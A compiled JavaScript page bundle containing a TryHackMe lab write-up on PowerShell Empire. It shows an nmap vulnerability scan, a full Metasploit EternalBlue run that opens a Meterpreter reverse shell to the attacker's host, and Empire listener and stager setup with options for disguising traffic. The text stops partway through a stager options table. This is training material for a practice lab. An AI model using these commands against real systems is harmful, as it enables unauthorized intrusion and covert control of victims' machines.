"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[4153],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>h});var o=t(67294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function s(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);n&&(o=o.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,o)}return t}function a(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?s(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):s(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,o,r=function(e,n){if(null==e)return{};var t,o,r={},s=Object.keys(e);for(o=0;o<s.length;o++)t=s[o],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(o=0;o<s.length;o++)t=s[o],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var l=o.createContext({}),p=function(e){var n=o.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):a(a({},n),e)),t},c=function(e){var n=p(e.components);return o.createElement(l.Provider,{value:n},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var n=e.children;return o.createElement(o.Fragment,{},n)}},d=o.forwardRef((function(e,n){var t=e.components,r=e.mdxType,s=e.originalType,l=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),u=p(t),d=r,h=u["".concat(l,".").concat(d)]||u[d]||m[d]||s;return t?o.createElement(h,a(a({ref:n},c),{},{components:t})):o.createElement(h,a({ref:n},c))}));function h(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var s=t.length,a=new Array(s);a[0]=d;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i[u]="string"==typeof e?e:r,a[1]=i;for(var p=2;p<s;p++)a[p]=t[p];return o.createElement.apply(null,a)}return o.createElement.apply(null,t)}d.displayName="MDXCreateElement"},69284:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>m,frontMatter:()=>s,metadata:()=>i,toc:()=>p});var o=t(87462),r=(t(67294),t(3905));const s={},a="PS Empire",i={unversionedId:"Tryhackme/PS Empire/PS Empire",id:"Tryhackme/PS Empire/PS Empire",title:"PS Empire",description:"Learn how to use Powershell Empire, a powerful post-exploitation framework.",source:"@site/writeups/Tryhackme/PS Empire/PS Empire.md",sourceDirName:"Tryhackme/PS Empire",slug:"/Tryhackme/PS Empire/",permalink:"/writeups/Tryhackme/PS Empire/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Overpass 2 - Hacked",permalink:"/writeups/Tryhackme/Overpass 2 - Hacked/Overpass 2"},next:{title:"Peak Hill",permalink:"/writeups/Tryhackme/Peak Hill/"}},l={},p=[{value:"Deploy!",id:"deploy",level:2},{value:"Install",id:"install",level:2},{value:"Listeners",id:"listeners",level:2},{value:"Stagers",id:"stagers",level:2},{value:"Agents and Post-Exploitation",id:"agents-and-post-exploitation",level:2}],c={toc:p},u="wrapper";function m(e){let{components:n,...t}=e;return(0,r.kt)(u,(0,o.Z)({},c,t,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"ps-empire"},"PS Empire"),(0,r.kt)("p",null,"Learn how to use Powershell Empire, a powerful post-exploitation framework."),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/rppsempire"},"PS Empire")),(0,r.kt)("h2",{id:"deploy"},"Deploy!"),(0,r.kt)("p",null,"Deploy this machine and discover what exploit this machine is vulnerable to. (Hint hint, this notice the VM name. I recommend completing the room 'Blue' prior to this room for this purpose alone.)"),(0,r.kt)("hr",null),(0,r.kt)("p",null,"Enjoy the room! For future rooms and write-ups, follow ",(0,r.kt)("a",{parentName:"p",href:"https://twitter.com/darkstar7471"},"@darkstar7471")," on Twitter."),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Deploy this machine and learn what exploitation this box is susceptible to!")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/PS Empire$ sudo nmap -A -p- --script vuln 10.10.80.135\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 22:18 CEST\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nNmap scan report for 10.10.80.135\nHost is up (0.032s latency).\nNot shown: 65526 closed ports\nPORT      STATE SERVICE            VERSION\n135/tcp   open  msrpc              Microsoft Windows RPC\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n3389/tcp  open  ssl/ms-wbt-server?\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n| rdp-vuln-ms12-020: \n|   VULNERABLE:\n|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2012-0152\n|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)\n|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.\n|           \n|     Disclosure date: 2012-03-13\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152\n|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020\n|   \n|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2012-0002\n|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)\n|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.\n|           \n|     Disclosure date: 2012-03-13\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002\n|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020\n|_sslv2-drown: \n49152/tcp open  msrpc              Microsoft Windows RPC\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n49153/tcp open  msrpc              Microsoft Windows RPC\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n49154/tcp open  msrpc              Microsoft Windows RPC\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n49158/tcp open  msrpc              Microsoft Windows RPC\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n49160/tcp open  msrpc              Microsoft Windows RPC\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/3%OT=135%CT=1%CU=36932%PV=Y%DS=2%DC=T%G=Y%TM=5F78DD\nOS:56%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS\nOS:=7)OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M\nOS:508NW8ST11%O6=M508ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20\nOS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M508NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y\nOS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD\nOS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0\nOS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1\nOS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI\nOS:=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n\nTRACEROUTE (using port 21/tcp)\nHOP RTT      ADDRESS\n1   31.72 ms 10.8.0.1\n2   31.92 ms 10.10.80.135\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 199.86 seconds\n")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"Exploit the vulnerability to spawn a reverse shell!")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"msf5 > search ms17-010\n\nMatching Modules\n================\n\n   #  Name                                           Disclosure Date  Rank     Check  Description\n   -  ----                                           ---------------  ----     -----  -----------\n   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\n   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection\n   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+\n   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution\n\n\nInteract with a module by name or index, for example use 5 or use exploit/windows/smb/smb_doublepulsar_rce\n\nmsf5 > use 2\n[*] Using configured payload windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > show options\n\nModule options (exploit/windows/smb/ms17_010_eternalblue):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT          445              yes       The target port (TCP)\n   SMBDomain      .                no        (Optional) The Windows domain to use for authentication\n   SMBPass                         no        (Optional) The password for the specified username\n   SMBUser                         no        (Optional) The username to authenticate as\n   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.\n   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.\n\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     192.168.178.52   yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 7 and Server 2008 R2 (x64) All Service Packs\n\n\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.8.106.222\nLHOST => 10.8.106.222\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.80.135\nRHOSTS => 10.10.80.135\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > exploit\n\n[*] Started reverse TCP handler on 10.8.106.222:4444 \n[*] 10.10.80.135:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check\n[+] 10.10.80.135:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)\n[*] 10.10.80.135:445      - Scanned 1 of 1 hosts (100% complete)\n[*] 10.10.80.135:445 - Connecting to target for exploitation.\n[+] 10.10.80.135:445 - Connection established for exploitation.\n[+] 10.10.80.135:445 - Target OS selected valid for OS indicated by SMB reply\n[*] 10.10.80.135:445 - CORE raw buffer dump (42 bytes)\n[*] 10.10.80.135:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes\n[*] 10.10.80.135:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv\n[*] 10.10.80.135:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      \n[+] 10.10.80.135:445 - Target arch selected valid for arch indicated by DCE/RPC reply\n[*] 10.10.80.135:445 - Trying exploit with 12 Groom Allocations.\n[*] 10.10.80.135:445 - Sending all but last fragment of exploit packet\n[*] 10.10.80.135:445 - Starting non-paged pool grooming\n[+] 10.10.80.135:445 - Sending SMBv2 buffers\n[+] 10.10.80.135:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.\n[*] 10.10.80.135:445 - Sending final SMBv2 buffers.\n[*] 10.10.80.135:445 - Sending last fragment of exploit packet!\n[*] 10.10.80.135:445 - Receiving response from exploit packet\n[+] 10.10.80.135:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!\n[*] 10.10.80.135:445 - Sending egg to corrupted connection.\n[*] 10.10.80.135:445 - Triggering free of corrupted buffer.\n[-] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[-] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[-] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[*] 10.10.80.135:445 - Connecting to target for exploitation.\n[+] 10.10.80.135:445 - Connection established for exploitation.\n[+] 10.10.80.135:445 - Target OS selected valid for OS indicated by SMB reply\n[*] 10.10.80.135:445 - CORE raw buffer dump (42 bytes)\n[*] 10.10.80.135:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes\n[*] 10.10.80.135:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv\n[*] 10.10.80.135:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      \n[+] 10.10.80.135:445 - Target arch selected valid for arch indicated by DCE/RPC reply\n[*] 10.10.80.135:445 - Trying exploit with 17 Groom Allocations.\n[*] 10.10.80.135:445 - Sending all but last fragment of exploit packet\n[*] 10.10.80.135:445 - Starting non-paged pool grooming\n[+] 10.10.80.135:445 - Sending SMBv2 buffers\n[+] 10.10.80.135:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.\n[*] 10.10.80.135:445 - Sending final SMBv2 buffers.\n[*] 10.10.80.135:445 - Sending last fragment of exploit packet!\n[*] 10.10.80.135:445 - Receiving response from exploit packet\n[+] 10.10.80.135:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!\n[*] 10.10.80.135:445 - Sending egg to corrupted connection.\n[*] 10.10.80.135:445 - Triggering free of corrupted buffer.\n[*] Sending stage (201283 bytes) to 10.10.80.135\n[*] Meterpreter session 1 opened (10.8.106.222:4444 -> 10.10.80.135:49185) at 2020-10-03 22:28:34 +0200\n[+] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.80.135:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n\nmeterpreter > shell\nProcess 2240 created.\nChannel 1 created.\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32>\n")),(0,r.kt)("h2",{id:"install"},"Install"),(0,r.kt)("p",null,"PowerShell Empire is a powerful post-exploitation framework which allows us to perform various functions such as privesc, password gathering, situational awareness, and many more!"),(0,r.kt)("p",null,"Link to the official website: ",(0,r.kt)("a",{parentName:"p",href:"https://www.bc-security.org/post/the-empire-3-0-strikes-back"},"https://www.bc-security.org/post/the-empire-3-0-strikes-back")),(0,r.kt)("p",null,"Clone the following GitHub page and run the initial setup script.\n",(0,r.kt)("a",{parentName:"p",href:"https://github.com/BC-SECURITY/Empire/"},"https://github.com/BC-SECURITY/Empire/")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"cd /opt")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"git clone ",(0,r.kt)("a",{parentName:"li",href:"https://github.com/BC-SECURITY/Empire/"},"https://github.com/BC-SECURITY/Empire/"))),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"cd /opt/Empire")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("ol",{start:4},(0,r.kt)("li",{parentName:"ol"},"./setup/install.sh")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("ol",{start:5},(0,r.kt)("li",{parentName:"ol"},"When prompted, enter in a server negotiation password. This can be left blank for random generation, however, you should record this somewhere such as a LastPass vault.")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("ol",{start:6},(0,r.kt)("li",{parentName:"ol"},"Launch Empire with either ./empire or /opt/Empire/empire")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("h2",{id:"listeners"},"Listeners"),(0,r.kt)("p",null,"If you're going to play ball, first you have to learn how to catch. Similar to 'catching' a reverse shell with Netcat, we first have to set up a listener in order to properly handle any sort of agent we would install on our victim machine. Answer the following questions using the listeners help menu and then spawn a basic listener."),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Once empire has launched, type help to view the various menus. Which menu to we launch to access listeners?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire) > help\n\nCommands\n========\nagents            Jump to the Agents menu.\ncreds             Add/display credentials to/from the database.\nexit              Exit Empire\nhelp              Displays the help menu.\ninteract          Interact with a particular agent.\nkeyword           Add keyword to database for obfuscation\nlist              Lists active agents or listeners.\nlisteners         Interact with active listeners.\nload              Loads Empire modules from a non-standard folder.\nplugin            Load a plugin file to extend Empire.\nplugins           List all available and active plugins.\npreobfuscate      Preobfuscate PowerShell module_source files\nreload            Reload one (or all) Empire modules.\nreport            Produce report CSV and log files: sessions.csv, credentials.csv, master.log\nreset             Reset a global option (e.g. IP whitelists).\nresource          Read and execute a list of Empire commands from a file.\nsearchmodule      Search Empire module names/descriptions.\nset               Set a global option (e.g. IP whitelists).\nshow              Show a global option (e.g. IP whitelists).\nuselistener       Use an Empire listener module.\nusemodule         Use an Empire module.\nusestager         Use an Empire stager.\n\n(Empire) >\n")),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},(0,r.kt)("inlineCode",{parentName:"p"},"listeners         Interact with active listeners."))),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"listeners")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"Launch the listeners menu. In a manner similar to cobalt strike/metasploit, this will launch a contextual submenu. For the sake of this tutorial, we will be using an http listener in order to catch our connections. Type the command 'uselistener http' now. You can double-tap tab to view all options for listeners following typing 'uselistener'")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire) > listeners\n[!] No listeners currently active \n(Empire: listeners) > uselistener http\n(Empire: listeners/http) > \n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"What command can we now type to view all of the options related to our selected listener type?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: listeners/http) > help\n\nListener Commands\n=================\nagents            Jump to the agents menu.\nback              Go back a menu.\ncreds             Display/return credentials from the database.\nexecute           Execute the given listener module.\nexit              Exit Empire.\nhelp              Displays the help menu.\ninfo              Display listener module options.\nlauncher          Generate an initial launcher for this listener.\nlisteners         Jump to the listeners menu.\nmain              Go back to the main menu.\nresource          Read and execute a list of Empire commands from a file.\nset               Set a listener option.\nunset             Unset a listener option.\n\n(Empire: listeners/http) > info\n\n    Name: HTTP[S]\nCategory: client_server\n\nAuthors:\n  @harmj0y\n\nDescription:\n  Starts a http[s] listener (PowerShell or Python) that uses a\n  GET/POST approach.\n\nHTTP[S] Options:\n\n  Name              Required    Value                            Description\n  ----              --------    -------                          -----------\n  Name              True        http                             Name for the listener.\n  Host              True        http://192.168.178.52            Hostname/IP for staging.\n  BindIP            True        0.0.0.0                          The IP to bind to on the control server.\n  Port              True                                         Port for the listener.\n  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.\n  StagingKey        True        (_2>^3n|1C94SaB&,!i;MPq5/[XAgUsv Staging key for initial agent negotiation.\n  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).\n  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).\n  DefaultLostLimit  True        60                               Number of missed checkins before exiting\n  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile for the agent.\n                                process.php|Mozilla/5.0 (Windows\n                                NT 6.1; WOW64; Trident/7.0;\n                                rv:11.0) like Gecko\n  CertPath          False                                        Certificate path for https listeners.\n  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).\n  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).\n  Headers           True        Server:Microsoft-IIS/7.5         Headers for the control server.\n  Cookie            False       jlJBeiGTEBCfbuZ                  Custom Cookie Name\n  StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php\n  UserAgent         False       default                          User-agent string to use for the staging request (default, none, or other).\n  Proxy             False       default                          Proxy to use for request (default, none, or other).\n  ProxyCreds        False       default                          Proxy credentials ([domain\\]username:password) to use for request (default, none, or other).\n  SlackURL          False                                        Your Slack Incoming Webhook URL to communicate with your Slack instance.\n\n\n(Empire: listeners/http) >\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"info")),(0,r.kt)("ol",{start:4},(0,r.kt)("li",{parentName:"ol"},"Once the information regarding the listener pops up, peruse this for some of the more interesting options we can set in order to disguise our actions more. Which option can we use to set specific times when our listener will be active?")),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},(0,r.kt)("inlineCode",{parentName:"p"},"WorkingHours      False                                        Hours for the agent to operate (09:00-17:00)."))),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"WorkingHours")),(0,r.kt)("ol",{start:5},(0,r.kt)("li",{parentName:"ol"},"Similar to changing/spoofing what browser you are using on the internet, what option can we set to appear as a different user agent (i.e. chrome, firefox, etc)?")),(0,r.kt)("p",null,"DefaultProfile    True /admin/get.php,/news.php,/login/ process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko    Default communication profile for the agent."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"DefaultProfile")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"What option can we use to set the port which the listener will bind to?")),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},(0,r.kt)("inlineCode",{parentName:"p"},"Port              True                                         Port for the listener."))),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Port")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"In addition to changing our browser profile, we can change what our server appears as. What option can we set to change this? ")),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"Depending on the context of the help menu you have up, this option might not show up (this is a rare case though). To provide further context to this question,\nthe server version can effective change your listener to appear as Microsoft IIS or possibly Apache. It's all about obfuscation in this context. ")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"ServerVersion")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"Launch our newly created listener on port 80 with the command 'execute'. What message is displayed following successfully launching the listener?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: listeners/http) > set Port 4444\n(Empire: listeners/http) > execute\n[*] Starting listener 'http'\n * Serving Flask app \"http\" (lazy loading)\n * Environment: production\n   WARNING: This is a development server. Do not use it in a production deployment.\n   Use a production WSGI server instead.\n * Debug mode: off\n[+] Listener successfully started!\n(Empire: listeners/http) >\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Listener successfully started!")),(0,r.kt)("ol",{start:4},(0,r.kt)("li",{parentName:"ol"},"We can verify that our listener is now active by typing what command?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: listeners/http) > listeners\n\n[*] Active listeners:\n\n  Name              Module          Host                                 Delay/Jitter   KillDate\n  ----              ------          ----                                 ------------   --------\n  http              http            http://192.168.178.52:4444           5/0.0                      \n")),(0,r.kt)("h2",{id:"stagers"},"Stagers"),(0,r.kt)("p",null,"Stagers metaphorically and literally set the stage for post-exploitation by retrieving the remaining code and associated information necessary to spawn a full-fledged agent."),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"First, type the command 'usestager' and double-tap tab to view all options we have for stagers. Which option allows us to use a batch file?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: listeners) > usestager \nmulti/bash                osx/applescript           osx/launcher              osx/shellcode             windows/dll               windows/launcher_sct      windows/shellcode\nmulti/launcher            osx/application           osx/macho                 osx/teensy                windows/ducky             windows/launcher_vbs      windows/teensy\nmulti/macro               osx/ducky                 osx/macro                 windows/backdoorLnkMacro  windows/hta               windows/launcher_xml      windows/wmic\nmulti/pyinstaller         osx/dylib                 osx/pkg                   windows/bunny             windows/launcher_bat      windows/macro             \nmulti/war                 osx/jar                   osx/safari_launcher       windows/csharp_exe        windows/launcher_lnk      windows/macroless_msword\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"windows/launcher_bat")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"Let's finish our previous command and select the batch file option. Press enter to finalize this. What is our new path to the 'module' we have selected?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: listeners) > usestager windows/launcher_bat\n(Empire: stager/windows/launcher_bat) >\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"stager/windows/launcher_bat")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"Since we've previously set our listener to use http, we must now set the associated options within our stager we are building to match that. What option must we set in order to accomplish this?")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"(Empire: stager/windows/launcher_bat) > info\n\nName: BAT Launcher\n\nDescription:\n  Generates a self-deleting .bat launcher for\n  Empire.\n\nOptions:\n\n  Name             Required    Value             Description\n  ----             --------    -------           -----------\n  Listener         True                          Listener to generate stager for.\n  Language         True        powershell        Language of the stager to generate.\n  StagerRetries    False       0                 Times for the stager to retry\n                                                 connecting.\n  OutFile          False       /tmp/launcher.bat File to output .bat launcher to,\n                                                 otherwise displayed 